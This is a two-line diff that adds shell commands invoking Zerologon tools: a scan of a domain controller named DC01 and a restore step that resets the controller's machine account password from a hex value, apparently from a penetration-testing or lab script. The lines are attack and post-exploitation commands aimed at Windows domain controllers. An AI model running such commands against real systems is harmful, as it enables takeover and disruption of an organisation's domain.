@@ -1,0 +1,2 @@
+zerologon-restore.py "$DOMAIN"/dc01@"$DC_HOST" -target-ip "$TARGET" -hexpass "69762...6945d"
+zerologon-scan.py DC01 "$DC_HOST"
